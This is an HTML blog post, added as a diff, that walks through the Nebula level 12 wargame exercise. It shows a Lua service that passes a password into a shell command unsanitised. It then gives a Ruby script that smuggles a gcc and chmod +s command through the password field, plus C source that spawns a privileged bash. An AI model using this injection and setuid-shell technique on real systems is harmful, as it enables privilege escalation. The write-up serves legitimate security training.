@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+<head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>Exploit Exercises - Nebula Level 12 &middot; jc han</title>
+
+  
+  <link rel="stylesheet" href="/css/poole.css">
+  <link rel="stylesheet" href="/css/hyde.css">
+  <link rel="stylesheet" href="/css/poole-overrides.css">
+  <link rel="stylesheet" href="/css/hyde-overrides.css">
+  <link rel="stylesheet" href="/css/hyde-x.css">
+  
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+  
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+  <link href="/favicon.png" rel="icon">
+
+  
+  
+  
+  
+
+  <meta name="description" content="">
+  <meta name="keywords" content="">
+  
+</head>
+<body>
+  <div class="sidebar">
+  <div class="container sidebar-sticky">
+    <div class="sidebar-about">
+      
+      <h1>jc han</h1>
+      
+    </div>
+
+    <ul class="sidebar-nav">
+      <li class="sidebar-nav-item"><a href="/">Blog</a></li>
+      
+    </ul>
+
+    <ul class="sidebar-nav">
+      <li class="sidebar-nav-item">
+      <a href="http://github.com/zealoct"><i class="fa fa-github-square fa-3x"></i></a>
+      
+      
+      
+      
+      <a href="http://twitter.com/zealoct"><i class="fa fa-twitter-square fa-3x"></i></a>
+      </li>
+    </ul>
+
+    <p>Copyright &copy; 2015 <a href="/license">License</a><br/>
+       Powered by <a href="http://gohugo.io">Hugo</a> and <a href="https://github.com/zyro/hyde-x">Hyde-X</a></p>
+  </div>
+</div>
+
+
+<div class="content container">
+  <div class="post">
+    <h1>Exploit Exercises - Nebula Level 12</h1>
+    <span class="post-date">Jan 26, 2014 &middot; 2 minute read &middot; <a href="/post/2014-01-26-nebula-level12/#disqus_thread">Comments</a>
+    
+    <br/>
+    
+    <a class="label" href="/categories/security">Security</a><a class="label" href="/categories/exercises">Exercises</a><a class="label" href="/categories/nebula">Nebula</a>
+    </span>
+    
+
+<h3 id="about:4f2f3bde9982f1888f7baf64aff676f9">About</h3>
+
+<p>There is a backdoor process listening on port 50001.</p>
+
+<p>To do this level, log in as the <em>level12</em> account with the password <em>level12</em>. Files for this level can be found in /home/flag12.</p>
+
+<!-- more -->
+
+<h3 id="source-code:4f2f3bde9982f1888f7baf64aff676f9">Source code</h3>
+
+<p>``` lua /home/flag12/flag12.lua
+local socketlocal socket = require(&ldquo;socket&rdquo;)
+local server = assert(socket.bind(&ldquo;127.0.0.1&rdquo;, 50001))</p>
+
+<p>function hash(password)
+  prog = io.popen(&ldquo;echo &ldquo;..password..&rdquo; | sha1sum&rdquo;, &ldquo;r&rdquo;)
+  data = prog:read(&rdquo;*all&rdquo;)
+  prog:close()</p>
+
+<p>data = string.sub(data, 1, 40)</p>
+
+<p>return data
+end</p>
+
+<p>while 1 do
+  local client = server:accept()
+  client:send(&ldquo;Password: &ldquo;)
+  client:settimeout(60)
+  local line, err = client:receive()
+  if not err then
+    print(&ldquo;trying &rdquo; .. line) &ndash; log from where ;\
+    local h = hash(line)</p>
+
+<pre><code>if h ~= &quot;4754a4f4bd5787accd33de887b9250a0691dd198&quot; then
+  client:send(&quot;Better luck next time\n&quot;);
+else
+  client:send(&quot;Congrats, your token is 413**CARRIER LOST**\n&quot;)
+end
+</code></pre>
+
+<p>end</p>
+
+<p>client:close()
+end</p>
+
+<pre><code>
+
+### Solution 
+
+`prog = io.popen(&quot;echo &quot;..password..&quot; | sha1sum&quot;, &quot;r&quot;)` this line of code in *hash()* function try to calc the hash of the password, but we can execute any command with a well structed *password*. 
+
+Write a simple Ruby script to send command to server, here I construct a *password* to make the server build a *drop.c* file into directory /home/flag12.
+
+``` ruby
+require 'socket'
+
+server = TCPSocket.open(&quot;127.0.0.1&quot;, 50001)
+server.puts(&quot;hello &amp;&amp; gcc -o /home/flag12/flag12 /tmp/drop.c &amp;&amp; chmod 777 /home/flag12/flag12 &amp;&amp; chmod +s /home/flag12/flag12 &amp;&amp; echo hello &quot;)
+ret = server.gets.chomp
+puts &quot;#{ret}&quot;
+</code></pre>
+
+<p>Remenber the piece of C code we used to drop privilege? Here it is again:</p>
+
+<p>``` c /tmp/drop.c
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <stdio.h></p>
+
+<p>int main() {
+  gid_t gid;
+  uid_t uid;
+  gid = getegid();
+  uid = geteuid();</p>
+
+<p>setresgid(gid, gid, gid);
+  setresuid(uid, uid, uid);</p>
+
+<p>execv(&ldquo;/bin/bash&rdquo;, NULL);
+}</p>
+
+<pre><code>
+Run the Ruby script, I got
+
+``` bash
+level12@nebula:~$ ruby client.rb
+Password: Better luck next time
+</code></pre>
+
+<p>It is all right, I have no interest in the password anyway. Take a look at the directory /home/flag12</p>
+
+<pre><code class="language-bash">flag12@nebula:~$ ll /home/flag12
+total 14
+drwxr-x--- 1 flag12 level12   60 2014-03-02 22:45 ./
+drwxr-xr-x 1 root   root     280 2012-08-27 07:18 ../
+-rw-r--r-- 1 flag12 flag12   220 2011-05-18 02:54 .bash_logout
+-rw-r--r-- 1 flag12 flag12  3353 2011-05-18 02:54 .bashrc
+-rwsrwsrwx 1 flag12 flag12  7322 2014-03-02 22:45 flag12*
+-rw-r--r-- 1 root   root     685 2011-11-20 21:22 flag12.lua
+-rw-r--r-- 1 flag12 flag12   675 2011-05-18 02:54 .profile
+</code></pre>
+
+<p>Here is the executable <em>flag12</em> with Set-User-ID bit, run it and a bash with <em>flag12</em> user privilege will show up!</p>
+
+  </div>
+  <div id="disqus_thread"></div>
+</div>
+
+
+<script type="text/javascript">
+var disqus_shortname = "hanjc";
+(function () {
+    var s = document.createElement('script'); s.async = true;
+    s.type = 'text/javascript';
+    s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+    (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+}());
+</script>
+
+
+
+<script type="text/javascript">
+    var disqus_shortname = "hanjc";
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+
+</body>
+</html>
